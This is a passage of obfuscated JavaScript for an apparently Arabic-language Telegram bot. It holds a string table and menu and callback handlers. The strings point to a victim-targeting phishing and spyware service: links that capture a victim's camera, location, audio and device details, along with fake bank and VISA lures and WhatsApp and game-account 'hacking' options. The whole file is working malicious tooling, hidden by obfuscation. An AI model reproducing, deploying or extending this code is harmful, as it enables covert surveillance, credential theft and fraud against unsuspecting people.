        'pbWzy',
        'VlIaV',
        '➖\x20وقت\x20الإن',
        'add_names',
        'إلى\x2030\x20نقط',
        'from',
        'تم\x20تلغيم\x20ا',
        '\x20تلقائيًا.',
        'ouszp',
        'dZrBQ',
        'حقق\x20من\x20حال',
        'التفسير:',
        'الرجاء\x20توف',
        'النص\x20الذي\x20',
        'خدام\x20/star',
        'TxBnY',
        'log',
        'السعودية\x20🇸🇦',
        '*اليوزر\x20:\x20',
        'qGRwF',
        'config',
        'creationTi',
        '-100248162',
        'NSmPV',
        'ور\x20🎨',
        'Rejection:',
        '*👤\x20معلومات',
        'لا\x20يوجد\x20وص',
        'getLocatio',
        'zcJZn',
        'textarea.f',
        'تم\x20إزالة\x20ق',
        'VrNAq',
        'polling_er',
        'شخص\x20جديد\x20د',
        'HBAEM',
        'إغلاق\x20المو',
        'member',
        '✅\x20تم\x20اخترق',
        'التردد\x20للا',
        'jnWBn',
        'خه.',
        'cSAfg',
        'شاء',
        'ناء\x20حذف\x20ال',
        'ال\x20الرابط\x20',
        'لقد\x20قمنا\x20ب',
        'erica',
        '\x20📊\x0a-\x20دقة\x20ا',
        '/getNam',
        'U.S.\x20Bank',
        '\x20🌍\x0a-\x20الدعم',
        'https://mo',
        'البوسنة\x20وا',
        'nKqIh',
        'ختيار\x20دولة',
        'descriptio',
        'first_name',
        'YrfKC',
        'klyyG',
        'ViXcZ',
        'Sakin',
        'أمر\x20/free\x20',
        'بريطانيا\x20🇬🇧',
        'طك.',
        'kMAiU',
        'https://ip',
        'HZgjt',
        'luxon',
        'oXzyg',
        '⚠️:\x0a',
        'المانيا\x20',
        '🇪🇪',
        'connection',
        '.\x20هذه\x20هي\x20ا',
        'زيمبابوي\x20🇿🇼',
        'SUteB',
        'screenReso',
        'lllTTTYYYI',
        'لم\x20تقم\x20بتج',
        '\x20stations:',
        'SUIvh',
        'FpoVS',
        'w.pinteres',
        'SnLIr',
        'checking',
        'goxtZ',
        'KWNIh',
        'triple',
        'AJqry',
        'هولندا',
        'Ffppy',
        'rVECc',
        'فرمتة\x20جوال',
        'Loading\x20Ra',
        '🇪🇨',
        'aQZSy',
        'سحب\x20جميع\x20ص',
        'أخرى\x20لاحق😁',
        '\x0a📍\x20خط\x20الطو',
        'لقد\x20قام\x20ضح',
        'عشوائية',
        's.html',
        'jxbxd',
        'سيتم\x20تصوير',
        'YtkIf',
        '\x20حتى\x20يتم\x20ا',
        'ائل\x20جديدة.',
        'لرابط\x20إليك',
        'قم\x20بإرسال\x20',
        'olnames.on',
        'rning-anim',
        'fWizX',
        'لم\x20يتم\x20الت',
        'هذا\x20لفتح\x20أ',
        'د\x20الجلسة:\x20',
        'FHFPb',
        'UVsqB',
        'IIXXXXJXXX',
        'eKCmx',
        'TZlrQ',
        '\x20as\x20expect',
        '\x20الرابط\x20بش',
        'اليمن\x20🇾🇪👑',
        'بيلاروس\x20🇧🇾',
        'خطأ\x20أثناء\x20',
        'Win64;\x20x64',
        '\x20أثناء\x20محا',
        'images',
        'vrMfz',
        'خال\x20رقم\x20ال',
        'ruxot',
        'fari/537.3',
        'العراق\x20🇮🇶',
        'إيقاف\x20البر',
        'ZyBFb',
        'SunTrust\x20B',
        'بمرجد\x20الدخ',
        'PcHAC',
        'broadcast',
        'JiDwJ',
        '\x0a📛\x20اسم\x20الح',
        'KiZOZ',
        'لا\x20توجد\x20نب',
        'MAyZM',
        'ZbiTT',
        'TIkRK',
        'وت\x20الضحيه💀',
        '➖\x20اضغط\x20على',
        '\x20النقاط\x20ال',
        'المجلد\x20غير',
        'F.html',
        'bjnEN',
        '🇵🇭',
        'BvnCe',
        '0\x20(Linux;\x20',
        'ceive-smss',
        'crwrw',
        'مرحبًا!\x20ان',
        'ion',
        '.png',
        'ة،\x20حاول\x20مر',
        'ر\x20بهذا\x20الب',
        'ame_link',
        'FGays',
        'qtzgV',
        'جيبوتي\x20🇩🇯',
        'received.',
        'صوت\x20أنثى',
        'انشاء\x20📅\x20:\x20',
        'فتيارات\x20شب',
        'AUwPX',
        '/c/?chatId',
        'wBjYS',
        'NTcrd',
        'ديو.',
        'getChat',
        'upport',
        'ck/:linkId',
        'عبر\x20رابط\x20🔒',
        'orm-contro',
        '50mb',
        'CIcBm',
        '.akinator.',
        'Mozilla/5.',
        'rest-plaus',
        'cUrPv',
        'كولومبيا\x20🇨🇴',
        'مرحباً\x20بك\x20',
        'rcel.app/',
        'لبوت\x20إلى\x20م',
        'لإيماءات\x20ا',
        'span.place',
        '➖\x20تاريخ\x20ال',
        'الدومينيكا',
        'zakhrafa',
        'toAij',
        'xttospeech',
        '/submitAud',
        'أوغندا\x20🇺🇬',
        'vice_info',
        'JXfJe',
        'الرسالة\x20رق',
        'ChAwp',
        'عدد\x20اليوزر',
        'SIGINT',
        'نوات:',
        'لرجاء\x20اعاد',
        'CeJhQ',
        'RcOLg',
        'PORT',
        '4.netlify.',
        'البرازيل\x20🇧🇷',
        'fluent-ffm',
        'get_camera',
        'n/x-www-fo',
        'SUwEa',
        'لتها\x20من\x20قا',
        'xrCHg',
        'Moyra',
        'باراغواي\x20🇵🇾',
        'الدخول\x20\x20له',
        'اليابان\x20🇯🇵',
        'rmdirSync',
        '\x20و\x20',
        '.\x0aعندما\x20تص',
        'obrYX',
        'tos',
        'WdNEu',
        'HsFea',
        'SNlPO',
        'ابط\x20أدناه\x20',
        'DsrzU',
        '\x0a📊\x20*التقدم',
        '/:userId',
        'xejOG',
        'الذكاء\x20الا',
        'untry/',
        'KVVAQ',
        'Hwjee',
        'sendVoice',
        'r_query',
        'ة\x20الدخول\x20م',
        'خدم:\x20',
        'XMLHttpReq',
        'احصل\x20على\x20ر',
        'إختراق\x20فري',
        'public',
        '\x20لنه\x20تم\x20فح',
        'أوكرانيا\x20🇺🇦',
        '🇵🇷',
        'قع\x20والبرام',
        'browserNam',
        'PxciI',
        'script',
        'cleanuri',
        'get_link',
        'Ljbtj',
        'floor',
        '/whatsapp',
        'اختراق\x20الك',
        '🇧🇷',
        'MRQtY',
        'بـ\x20\x22https\x22',
        'LMEWs',
        '🇱🇧',
        'ت\x20خبيثه\x20خا',
        'https://fa',
        'TumhJ',
        'الحصول\x20على',
        '8144014442',
        'يه\x202\x20☎️',
        'EqbNS',
        'YWTfl',
        'YfhEJ',
        'ة\x20في\x20',
        'roOCL',
        'unban_user',
        'fDynE',
        'AXsyc',
        'qwKsE',
        '\x20عاليه\x20🖼',
        'USA🇺🇸',
        'لبوت.',
        '/getName',
        'توباغو\x20🇹🇹',
        'mat\x20is\x20not',
        'osHst',
        'all',
        'vsqBw',
        'ber',
        'FGDBi',
        'الصور:',
        'لرقام\x20الضح',
        'صطناعي\x20الش',
        'الجزائر\x20🇩🇿',
        'append',
        'r_choice',
        'isa',
        '\x20ميغابت\x20في',
        'get_freefi',
        '\x20🧠\x0a-\x20الذاك',
        'jgTbT',
        '📤\x20فيديو\x20تم',
        'قيرغيزستان',
        'ZjylR',
        'https://te',
        'SENYe',
        'IT\x20-\x20VISA\x20',
        'ا\x20الرجاء\x20ا',
        '🇬🇧',
        'oCdWF',
        'PXbkg',
        'pMVfM',
        'pdBra',
        'ع\x20اضافة\x20فا',
        'الفلبين\x20🇵🇭',
        'sendMessag',
        'wgDDd',
        'ألمانيا\x20🇩🇪',
        'ان\x20تخترقك\x20',
        'next_',
        'JqPJu',
        'inkId',
        'تم\x20إرسال\x20ا',
        'خطأ\x20في\x20الت',
        'Uncaught\x20E',
        'رة\x20الداخلي',
        'ngan.glitc',
        'فه\x20ولكن\x20لا',
        'split',
        'FWxFf',
        '-100260228',
        'fvDSp',
        'dAbmF',
        'lP_12',
        'فعل.',
        'ase\x20try\x20ag',
        '1786657Wuwexw',
        'https://ex',
        '\x0aاستخدم\x20ال',
        'deviceVers',
        'ب\x20🛎•\x20\x0a➖\x20رق',
        'UeaVF',
        'gRgsF',
        'female_voi',
        'عية',
        'post',
        'ابط\x20الخاص\x20',
        'ك\x20VIP',
        'for\x20chatId',
        'kUsrm',
        'RyqTV',
        'حصول\x20على\x20ا',
        'يناتور!\x20اض',
        'cOrhGA',
        'i.html',
        'مستخدم\x20لإز',
        'على\x201\x20نقطة',
        'inDcf',
        'nltfR',
        'ه\x20وكلمات\x20ج',
        'bJbOH',
        'ل\x20على\x20المن',
        'FhPOM',
        'uncaughtEx',
        'xobpc',
        'QMNOy',
        'ener',
        '/v1/text:s',
        'اختراق\x20بث\x20',
        'onkYJ',
        'إضافة\x20مشتر',
        'info.io/',
        'mZNMF',
        'SleDi',
        'VFyeN',
        '`\x0a*=======',
        '\x20لشركة\x20وتس',
        'getChatMem',
        '░]\x2050%',
        'ARkAa',
        'on...\x0a[▓▓░',
        'TBRRa',
        '\x20لمعرفة\x20نق',
        's.json',
        'ont/:linkI',
        'تجرام\x20🖥',
        'الكويت\x20🇰🇼',
        '*الاسم\x20:\x20',
        'لصوت:',
        'بط\x20دعوة',
        'cNcYf',
        'من\x20هذا\x20الد',
        'Send\x20Messa',
        'ميله\x20ومحرج',
        'unlinkSync',
        'reply_mark',
        'اختر\x20الدول',
        '`\x0a*[-]\x20Cou',
        'mwAKN',
        'اط.',
        'كوريا\x20الشم',
        'yXTPg',
        '1_fr/none.',
        'pYsrg',
        'في\x20هذا\x20الد',
        'aAiJC',
        'vJlWw',
        'rred,\x20retr',
        'each',
        'get_radio_',
        'dgTDq',
        'captureBac'
    ];
    _0x2612 = function () {
        return _0x4a271f;
    };
    return _0x2612();
}
let vipUsers = {};
function addVIPUser(_0x9dc7f2) {
    vipUsers[_0x9dc7f2] = !![];
}
function removeVIPUser(_0x530223) {
    delete vipUsers[_0x530223];
}
function isVIPUser(_0x2d6724) {
    return !!vipUsers[_0x2d6724];
}
bot[_0x298049(0x65c)](/\/stㅇㅗㅑㅡarㅏt/, async _0x40bc06 => {
    const _0x414a56 = _0x298049, _0x18ed1f = {
            'QMNOy': function (_0x465b22, _0x530c03) {
                return _0x465b22(_0x530c03);
            },
            'zynwb': _0x414a56(0x2e9) + _0x414a56(0xba9) + _0x414a56(0xc36) + _0x414a56(0x2c1) + _0x414a56(0xb85) + _0x414a56(0xae2),
            'foheo': _0x414a56(0x1f5) + _0x414a56(0x451) + _0x414a56(0x516),
            'FGDBi': _0x414a56(0xacb) + _0x414a56(0x8de) + _0x414a56(0x389),
            'ZgPNh': _0x414a56(0xacb) + _0x414a56(0xb9b) + _0x414a56(0xce6),
            'MuAYF': _0x414a56(0x285) + _0x414a56(0x871),
            'qlSrW': _0x414a56(0xcf8) + _0x414a56(0xba3),
            'PTMDs': _0x414a56(0x1ff) + _0x414a56(0x832) + _0x414a56(0x772),
            'bNKLn': _0x414a56(0xa9d) + 's',
            'zXCxA': _0x414a56(0x1f4) + _0x414a56(0xc71),
            'PxciI': _0x414a56(0x486) + _0x414a56(0x482),
            'Bbdec': _0x414a56(0x8a9) + _0x414a56(0xb87),
            'lvKgl': _0x414a56(0x9a4) + _0x414a56(0x83d),
            'ukqIW': _0x414a56(0x60e) + _0x414a56(0xb4a),
            'bJbOH': _0x414a56(0x80a) + _0x414a56(0xc32),
            'NuunP': _0x414a56(0x21d) + _0x414a56(0xcb1),
            'jtJqm': _0x414a56(0x265),
            'mXSux': _0x414a56(0x61b) + _0x414a56(0x37b),
            'RPRdA': _0x414a56(0xaf3) + 're',
            'ecfnL': _0x414a56(0x89b) + _0x414a56(0x1e1),
            'tctMn': _0x414a56(0x9ca),
            'YenYu': _0x414a56(0x521) + _0x414a56(0x40f),
            'HKyvD': _0x414a56(0x1a8) + _0x414a56(0x62d) + _0x414a56(0xceb),
            'cuKiP': _0x414a56(0x1bd) + _0x414a56(0x49a) + _0x414a56(0x24f) + _0x414a56(0xb0f) + _0x414a56(0x53f),
            'EUpmM': _0x414a56(0xbf3) + _0x414a56(0x5e0),
            'ZjylR': _0x414a56(0x429) + _0x414a56(0xa8f),
            'wodHP': _0x414a56(0x5ac) + _0x414a56(0x6a5),
            'yNfCl': _0x414a56(0x9fb) + _0x414a56(0xa36) + _0x414a56(0xb99) + _0x414a56(0x8a0) + _0x414a56(0x958),
            'KrIGY': _0x414a56(0x1b9) + _0x414a56(0xcd2),
            'eKCmx': _0x414a56(0xac7),
            'lIlaR': _0x414a56(0x8fd) + _0x414a56(0x6db) + _0x414a56(0x633),
            'fYUiR': _0x414a56(0x3f6),
            'kfOum': _0x414a56(0x8b3) + _0x414a56(0x621),
            'efVQI': _0x414a56(0x412) + _0x414a56(0xa80) + _0x414a56(0xc16) + _0x414a56(0x8cb) + _0x414a56(0x5df),
            'TOWSr': _0x414a56(0x327) + _0x414a56(0x48d),
            'eMQbE': _0x414a56(0x1fe) + _0x414a56(0x818) + '3',
            'mbavs': _0x414a56(0x9eb) + _0x414a56(0x83c),
            'Alagt': _0x414a56(0x7fb) + _0x414a56(0x8dd) + _0x414a56(0x43a) + _0x414a56(0x571) + 'e/',
            'bknEG': _0x414a56(0x356) + _0x414a56(0x647),
            'eIiWp': _0x414a56(0xb8d) + 'il',
            'rnCJP': _0x414a56(0x80c) + '💳',
            'kWBzm': _0x414a56(0x4ab) + _0x414a56(0xaf1),
            'heUam': _0x414a56(0xce7) + _0x414a56(0xae0),
            'vRNAS': _0x414a56(0x430) + _0x414a56(0x687),
            'dyoOf': _0x414a56(0x594) + _0x414a56(0x32d),
            'osPBl': _0x414a56(0x5ce) + _0x414a56(0x201),
            'CndRd': _0x414a56(0x1a9) + _0x414a56(0x300),
            'NfLAH': _0x414a56(0x6bc),
            'icHhZ': _0x414a56(0xca6) + _0x414a56(0x6d0),
            'GTrAs': _0x414a56(0x29c) + 's',
            'bJDHu': _0x414a56(0x823) + _0x414a56(0x9df),
            'PcHAC': _0x414a56(0x1b2) + _0x414a56(0x1f2),
            'YfhEJ': _0x414a56(0x9a5) + _0x414a56(0xcab),
            'uUotS': _0x414a56(0x7ba),
            'wIkGB': _0x414a56(0xb39) + _0x414a56(0xd35),
            'EwTFb': _0x414a56(0xb62) + _0x414a56(0x51b) + '0',
            'xzGpN': _0x414a56(0xc70) + _0x414a56(0xd09),
            'vtZbr': _0x414a56(0xa8a),
            'VHFrF': _0x414a56(0x583) + _0x414a56(0x95d),
            'pqMev': _0x414a56(0x568) + 'xt',
            'SxZVB': _0x414a56(0xc21) + _0x414a56(0x805),
            'RJiqo': _0x414a56(0x720) + 'e',
            'SCqBp': _0x414a56(0xab3) + _0x414a56(0xaed) + _0x414a56(0x4a2),
            'ggbbk': _0x414a56(0x9c0) + _0x414a56(0x678),
            'toAij': _0x414a56(0x1a9) + _0x414a56(0xad6),
            'sgAeW': _0x414a56(0x629) + _0x414a56(0x96d),
            'FKAlL': _0x414a56(0x207) + _0x414a56(0x2c2) + '\x20⛔',
            'SkXFF': _0x414a56(0x650) + 'ة',
            'NbiyL': _0x414a56(0xcea) + _0x414a56(0x319),
            'nmTIc': _0x414a56(0x1fe) + _0x414a56(0x28d),
            'UZaIC': function (_0x2cf6d4, _0x48834a) {
                return _0x2cf6d4 === _0x48834a;
            },
            'ZGNqw': _0x414a56(0xc8e) + _0x414a56(0x5b5) + _0x414a56(0x875) + _0x414a56(0x262),
            'OwDMk': _0x414a56(0xb3b) + _0x414a56(0xb24),
            'pCcLe': _0x414a56(0xb94),
            'HIiMJ': _0x414a56(0x41f) + _0x414a56(0x7f4),
            'YFEno': _0x414a56(0xb81)
        }, _0x35398c = _0x40bc06[_0x414a56(0x556)]['id'], _0x1e37d8 = await _0x18ed1f[_0x414a56(0xb36)](isUserSubscribed, _0x35398c);
    if (!_0x1e37d8) {
        const _0x1b84b9 = _0x18ed1f[_0x414a56(0x96a)], _0x32f74b = developerChannels[_0x414a56(0x5c0)](_0x167265 => [{
                    'text': _0x414a56(0x657) + _0x167265,
                    'url': _0x414a56(0x1fe) + _0x414a56(0x958) + _0x167265[_0x414a56(0x891)](0x211 * 0xa + -0x3 * 0xc95 + 0x9 * 0x1e6)
                }]);
        bot[_0x414a56(0xb04) + 'e'](_0x35398c, _0x1b84b9, { 'reply_markup': { 'inline_keyboard': _0x32f74b } });
        return;
    }
    const _0x45ae16 = _0x18ed1f[_0x414a56(0x18d)], _0x48fd42 = [
            [
                {
                    'text': _0x18ed1f[_0x414a56(0xaea)],
                    'callback_data': _0x414a56(0x363) + _0x414a56(0x8fa) + _0x35398c
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x52b)],
                    'callback_data': _0x414a56(0xb64) + 'k:' + _0x35398c
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x78a)],
                    'callback_data': _0x414a56(0x9e3) + 'n:' + _0x35398c
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x52c)],
                    'callback_data': _0x414a56(0xd19) + 'e:' + _0x35398c
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0xc59)],
                    'callback_data': _0x18ed1f[_0x414a56(0xcc0)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0xc2f)],
                    'callback_data': _0x18ed1f[_0x414a56(0xac4)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x9ac)],
                    'callback_data': _0x18ed1f[_0x414a56(0x2a4)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x843)],
                    'callback_data': _0x414a56(0x996) + _0x414a56(0x2e0) + _0x35398c
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0xb31)],
                    'callback_data': _0x414a56(0x7c4) + _0x414a56(0xbe3) + _0x35398c
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x1de)],
                    'callback_data': _0x18ed1f[_0x414a56(0x1c8)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x2b5)],
                    'callback_data': _0x18ed1f[_0x414a56(0x2b3)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x8c7)],
                    'callback_data': _0x18ed1f[_0x414a56(0x869)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0xc4c)],
                    'callback_data': _0x414a56(0xd25) + 'k:' + _0x35398c
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x41d)],
                    'web_app': { 'url': _0x18ed1f[_0x414a56(0x6cf)] }
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x8b7)],
                    'callback_data': _0x18ed1f[_0x414a56(0xaf8)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x303)],
                    'web_app': { 'url': _0x18ed1f[_0x414a56(0x83a)] }
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0xb73)],
                    'callback_data': _0x18ed1f[_0x414a56(0xa3e)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x8ea)],
                    'callback_data': _0x18ed1f[_0x414a56(0x6af)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x21c)],
                    'web_app': { 'url': _0x18ed1f[_0x414a56(0x510)] }
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x354)],
                    'url': _0x18ed1f[_0x414a56(0xc9b)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x66a)],
                    'web_app': { 'url': _0x18ed1f[_0x414a56(0x781)] }
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x2e7)],
                    'callback_data': _0x18ed1f[_0x414a56(0x848)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x43b)],
                    'callback_data': _0x18ed1f[_0x414a56(0x8be)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x837)],
                    'callback_data': _0x18ed1f[_0x414a56(0x7a0)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x576)],
                    'callback_data': _0x18ed1f[_0x414a56(0x320)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0xcb8)],
                    'callback_data': _0x18ed1f[_0x414a56(0x623)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x1d4)],
                    'callback_data': _0x18ed1f[_0x414a56(0x197)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x63f)],
                    'callback_data': _0x18ed1f[_0x414a56(0xa51)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0xad9)],
                    'callback_data': _0x18ed1f[_0x414a56(0xca3)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x398)],
                    'callback_data': _0x18ed1f[_0x414a56(0xc15)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x7a5)],
                    'callback_data': _0x18ed1f[_0x414a56(0x78e)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x7bc)],
                    'callback_data': _0x18ed1f[_0x414a56(0x3a5)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0x850)],
                    'callback_data': _0x18ed1f[_0x414a56(0x190)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x4e3)],
                    'callback_data': _0x18ed1f[_0x414a56(0xc82)]
                }
            ],
            [
                {
                    'text': _0x18ed1f[_0x414a56(0xa8b)],
                    'callback_data': _0x18ed1f[_0x414a56(0x1b8)]
                },
                {
                    'text': _0x18ed1f[_0x414a56(0x434)],
                    'callback_data': _0x18ed1f[_0x414a56(0x547)]
                }
            ],
            [{
                    'text': _0x18ed1f[_0x414a56(0x716)],
                    'url': _0x18ed1f[_0x414a56(0x515)]
                }]
        ];
    bot[_0x414a56(0xb04) + 'e'](_0x35398c, _0x45ae16, { 'reply_markup': { 'inline_keyboard': _0x48fd42 } });
    if (_0x18ed1f[_0x414a56(0x813)](_0x35398c, -0x2e * 0xc5d10c1 + 0xda8a9b0d + -0xe6c087c9 * -0x3)) {
        const _0xf26fae = _0x18ed1f[_0x414a56(0x4fb)], _0xddaaa1 = [[
                    {
                        'text': _0x18ed1f[_0x414a56(0x5c1)],
                        'callback_data': _0x18ed1f[_0x414a56(0x63d)]
                    },
                    {
                        'text': _0x18ed1f[_0x414a56(0x3a1)],
                        'callback_data': _0x18ed1f[_0x414a56(0x39a)]
                    }
                ]];
        bot[_0x414a56(0xb04) + 'e'](_0x35398c, _0xf26fae, { 'reply_markup': { 'inline_keyboard': _0xddaaa1 } });
    }
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x5d89c9 => {
    const _0x142d02 = _0x298049, _0x49c270 = {
            'KqFxX': function (_0x472c84, _0x2ae477) {
                return _0x472c84 === _0x2ae477;
            },
            'rXKum': _0x142d02(0x486) + _0x142d02(0x482),
            'hTiIw': function (_0x42a8ab, _0x173712) {
                return _0x42a8ab !== _0x173712;
            },
            'ARkAa': _0x142d02(0x4f3) + _0x142d02(0x32a) + _0x142d02(0x45e) + _0x142d02(0x1a4) + _0x142d02(0x21a)
        }, _0x50cafa = _0x5d89c9[_0x142d02(0x33c)][_0x142d02(0x556)]['id'], _0x4c990b = _0x5d89c9[_0x142d02(0xc57)];
    if (_0x49c270[_0x142d02(0x2f1)](_0x4c990b, _0x49c270[_0x142d02(0x2cd)])) {
        const _0x45917f = _0x142d02(0xcee) + _0x142d02(0x69d) + _0x142d02(0x989) + _0x142d02(0x5de) + _0x142d02(0x654) + _0x142d02(0x778) + baseUrl + (_0x142d02(0x677) + 'd=') + _0x50cafa;
        _0x45917f && _0x49c270[_0x142d02(0x3fd)](_0x45917f[_0x142d02(0x5b6)](), '') ? bot[_0x142d02(0xb04) + 'e'](_0x50cafa, _0x45917f) : console[_0x142d02(0x9d7)](_0x49c270[_0x142d02(0xb44)]);
    }
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x44b7ee => {
    const _0x3f5cff = _0x298049, _0x5d3837 = {
            'KhaME': function (_0x322a69, _0x232ae8) {
                return _0x322a69(_0x232ae8);
            },
            'kufSI': function (_0x269aa5, _0x1fe04f) {
                return _0x269aa5 !== _0x1fe04f;
            },
            'lsPpj': function (_0x32144e, _0x23fd2a) {
                return _0x32144e !== _0x23fd2a;
            },
            'CYrVV': _0x3f5cff(0x9ca),
            'fKEYO': _0x3f5cff(0xa9d) + 's',
            'JFxrW': _0x3f5cff(0xaf3) + 're',
            'VBYQu': _0x3f5cff(0x996) + _0x3f5cff(0x69a),
            'RsBvL': _0x3f5cff(0x265),
            'pdBra': _0x3f5cff(0xd25) + 'k',
            'SLiyO': _0x3f5cff(0x3f6),
            'ViXcZ': _0x3f5cff(0x7c4) + _0x3f5cff(0x85b),
            'VRHWw': _0x3f5cff(0x2e9) + _0x3f5cff(0xba9) + _0x3f5cff(0xc36) + _0x3f5cff(0x2c1) + _0x3f5cff(0xb85) + _0x3f5cff(0xae2),
            'dpaMQ': function (_0x8e3285, _0x590fc3) {
                return _0x8e3285 === _0x590fc3;
            },
            'mzmCk': _0x3f5cff(0x9a4) + _0x3f5cff(0x83d),
            'VXbVV': function (_0x4f2959, _0x1ab2e7) {
                return _0x4f2959 === _0x1ab2e7;
            },
            'onkYJ': _0x3f5cff(0x590),
            'whLhz': _0x3f5cff(0xb9e) + _0x3f5cff(0x8fb) + _0x3f5cff(0x223) + _0x3f5cff(0x206) + _0x3f5cff(0x1d5) + _0x3f5cff(0x417),
            'dxBGJ': _0x3f5cff(0x7d5) + _0x3f5cff(0x901) + _0x3f5cff(0x3ef) + _0x3f5cff(0x392) + 'ns',
            'zgkFH': _0x3f5cff(0x57e) + _0x3f5cff(0x20d),
            'TumhJ': _0x3f5cff(0x60c),
            'PvEsM': _0x3f5cff(0xc79) + _0x3f5cff(0x5a6) + _0x3f5cff(0x88f) + _0x3f5cff(0x7c9) + _0x3f5cff(0x3b5) + _0x3f5cff(0x902) + _0x3f5cff(0x78d) + _0x3f5cff(0x347) + _0x3f5cff(0x76c) + _0x3f5cff(0x61e) + 'cA',
            'uXwVx': _0x3f5cff(0x9c3) + _0x3f5cff(0xce4),
            'FccNh': _0x3f5cff(0x40b) + _0x3f5cff(0x962),
            'KVVAQ': _0x3f5cff(0xb86) + _0x3f5cff(0xcc9) + _0x3f5cff(0x792) + _0x3f5cff(0x203) + _0x3f5cff(0x8e1) + _0x3f5cff(0x37e) + _0x3f5cff(0x6ce),
            'QSNHL': function (_0x5263db, _0x5e58c7) {
                return _0x5263db === _0x5e58c7;
            },
            'JOLQe': _0x3f5cff(0x853) + _0x3f5cff(0x24c),
            'QSvfG': _0x3f5cff(0x4f6) + _0x3f5cff(0x5bf) + _0x3f5cff(0x271) + _0x3f5cff(0x27e) + _0x3f5cff(0x751) + _0x3f5cff(0xb52) + _0x3f5cff(0xb30) + _0x3f5cff(0x701) + _0x3f5cff(0xb41) + _0x3f5cff(0x6f7) + _0x3f5cff(0x4da) + _0x3f5cff(0xb72) + _0x3f5cff(0xb02) + _0x3f5cff(0xcd1) + _0x3f5cff(0x715) + _0x3f5cff(0x5e6),
            'UxcoN': _0x3f5cff(0x40b) + _0x3f5cff(0x5ee) + _0x3f5cff(0x5b8),
            'ROQnT': _0x3f5cff(0xb86) + _0x3f5cff(0xcc9) + _0x3f5cff(0x51e) + _0x3f5cff(0xc98) + _0x3f5cff(0x4d5) + _0x3f5cff(0xa29) + _0x3f5cff(0x830),
            'SYPZQ': function (_0x16e6d4, _0x1e4802) {
                return _0x16e6d4 !== _0x1e4802;
            },
            'UHNTV': function (_0x382618, _0x674c1c) {
                return _0x382618 === _0x674c1c;
            },
            'FhPOM': _0x3f5cff(0xb94),
            'acKaN': function (_0x263db5, _0x432bda) {
                return _0x263db5 == _0x432bda;
            },
            'XlYii': _0x3f5cff(0x268) + _0x3f5cff(0x3f5) + _0x3f5cff(0x645) + _0x3f5cff(0x78c) + 'P:',
            'CgyuY': _0x3f5cff(0x33c),
            'ekNkW': function (_0x37ad2e, _0x2ed7b1) {
                return _0x37ad2e === _0x2ed7b1;
            },
            'oURpJ': _0x3f5cff(0xb81),
            'EqbNS': function (_0x464049, _0x339d82) {
                return _0x464049 == _0x339d82;
            },
            'inWWH': _0x3f5cff(0x268) + _0x3f5cff(0x3f5) + _0x3f5cff(0xb2c) + _0x3f5cff(0x89e) + 'P:',
            'goxtZ': function (_0x2c99bc, _0x1de232) {
                return _0x2c99bc !== _0x1de232;
            },
            'PEkrm': function (_0x4d17b7, _0x436d4f, _0x3e7e1d) {
                return _0x4d17b7(_0x436d4f, _0x3e7e1d);
            },
            'EliQo': _0x3f5cff(0x363) + 'nt',
            'QceDj': _0x3f5cff(0xb64) + 'k',
            'uGaFT': _0x3f5cff(0x9e3) + 'n',
            'ploqB': _0x3f5cff(0x612),
            'yxnnY': _0x3f5cff(0xd19) + 'e'
        }, _0x389c8d = _0x44b7ee[_0x3f5cff(0x33c)][_0x3f5cff(0x556)]['id'], _0x9edcce = _0x44b7ee[_0x3f5cff(0xc57)], _0x400bce = [
            _0x5d3837[_0x3f5cff(0x263)],
            _0x5d3837[_0x3f5cff(0x452)],
            _0x5d3837[_0x3f5cff(0x54d)],
            _0x5d3837[_0x3f5cff(0x40d)],
            _0x5d3837[_0x3f5cff(0x3f3)],
            _0x5d3837[_0x3f5cff(0xb01)],
            _0x5d3837[_0x3f5cff(0x458)],
            _0x5d3837[_0x3f5cff(0xa03)]
        ];
    if (!_0x400bce[_0x3f5cff(0x948)](_0x9edcce[_0x3f5cff(0xb11)](':')[0x1dd7 + 0x60e + -0x23e5]) && !await _0x5d3837[_0x3f5cff(0x644)](isUserSubscribed, _0x389c8d)) {
        const _0x377de5 = _0x5d3837[_0x3f5cff(0x5b7)], _0x53ebc1 = developerChannels[_0x3f5cff(0x5c0)](_0x1cc3ed => ({
                'text': _0x3f5cff(0x657) + _0x1cc3ed,
                'url': _0x3f5cff(0x1fe) + _0x3f5cff(0x958) + _0x1cc3ed[_0x3f5cff(0x891)](-0x420 * 0x4 + 0x2064 + 0xfe3 * -0x1)
            }));
